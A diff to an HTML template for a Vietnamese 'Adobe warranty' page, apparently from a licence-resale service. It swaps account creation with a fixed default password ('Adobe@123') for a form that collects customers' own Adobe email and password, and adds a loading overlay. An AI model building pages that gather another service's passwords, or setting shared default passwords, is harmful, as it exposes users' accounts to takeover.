@@ -64,7 +64,8 @@
             transition: all 0.3s;
         }
         
-        input[type="text"] {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 12px 15px;
             border: 2px solid #e0e0e0;
@@ -74,7 +75,8 @@
         }
         
         input[type="email"]:focus,
-        input[type="text"]:focus {
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             outline: none;
             border-color: #667eea;
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
@@ -161,12 +163,66 @@
         .back-link:hover {
             text-decoration: underline;
         }
+        /* Loading overlay styles */
+        .overlay {
+            position: fixed;
+            inset: 0; /* top:0; right:0; bottom:0; left:0; */
+            background: rgba(0,0,0,0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            pointer-events: none;
+        }
+
+        .overlay.active {
+            display: flex;
+            pointer-events: auto; /* block interactions behind */
+        }
+
+        .overlay .card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px 28px;
+            max-width: 520px;
+            width: calc(100% - 40px);
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+        }
+
+        .overlay h2 {
+            margin-bottom: 10px;
+            color: #333;
+            font-size: 20px;
+        }
+
+        .overlay p {
+            color: #444;
+            margin-bottom: 8px;
+            line-height: 1.4;
+            font-size: 15px;
+        }
+
+        /* Simple spinner */
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 5px solid #e6e6e6;
+            border-top-color: #667eea;
+            animation: spin 1s linear infinite;
+            margin: 14px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔧 Bảo hành Adobe</h1>
-        <p class="subtitle">Tạo tài khoản mới và thêm vào Admin Console</p>
+        <p class="subtitle">Bảo hành, add lại bản quyền vào tài khoản lỗi</p>
         
         {% if message %}
         <div class="message {% if '✓' in message %}success{% else %}error{% endif %}">
@@ -176,22 +232,32 @@
         
         <form method="POST" action="/baohanh">
             <div class="form-group">
-                <label for="email">Email khách hàng:</label>
+                <label for="email">Email Adobe của bạn:</label>
                 <input 
                     type="email" 
                     id="email" 
                     name="email" 
-                    placeholder="example@email.com"
+                    placeholder="example@gmail.com"
                     required
                     autofocus
                 >
                 <small style="color: #999; display: block; margin-top: 5px;">
-                    Email này sẽ được tạo tài khoản Adobe mới với password: Adobe@123
+                    Tài khoản mà bạn đang sử dụng bị lỗi.
                 </small>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Mật khẩu:</label>
+                <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    placeholder="Nhập mật khẩu tài khoản Adobe của bạn"
+                >
             </div>
             
             <button type="submit" class="btn">
-                Tạo tài khoản và thêm vào Admin Console
+                Bảo hành
             </button>
         </form>
         
@@ -218,5 +284,53 @@
         
         <a href="/" class="back-link">← Quay về trang chủ</a>
     </div>
+    <!-- Loading overlay (shown on form submit) -->
+    <div id="loading-overlay" class="overlay" role="status" aria-hidden="true" aria-live="polite">
+        <div class="card" onclick="event.stopPropagation();">
+            <div class="spinner" aria-hidden="true"></div>
+            <h2>Đang thực hiện bảo hành</h2>
+            <p>Đang thực hiện bảo hành, thời gian dự kiến 5 phút</p>
+            <p>Vui lòng không tắt tab này để tránh các vấn đề phát sinh khác</p>
+            <p><strong>Cảm ơn bạn đã kiên nhẫn</strong></p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            var form = document.querySelector('form');
+            var overlay = document.getElementById('loading-overlay');
+
+            function showOverlay() {
+                if (!overlay) return;
+                overlay.classList.add('active');
+                overlay.setAttribute('aria-hidden', 'false');
+
+                // Delay disabling controls so the browser can serialize their values
+                // during the current submission. Disabling immediately in the submit
+                // event can remove them from the form data in some browsers.
+                setTimeout(function() {
+                    var controls = form.querySelectorAll('input, button, select, textarea');
+                    controls.forEach(function(el) {
+                        el.disabled = true;
+                    });
+                }, 50);
+            }
+
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    // Show overlay immediately; allow normal submit to continue
+                    showOverlay();
+                });
+            }
+
+            // Safety: if the page navigates back via history and overlay is still active,
+            // hide it once DOM is interactive again.
+            window.addEventListener('pageshow', function() {
+                if (overlay && overlay.classList.contains('active')) {
+                    // keep showing only if navigation is still in progress; we don't auto-hide
+                }
+            });
+        })();
+    </script>
 </body>
 </html>
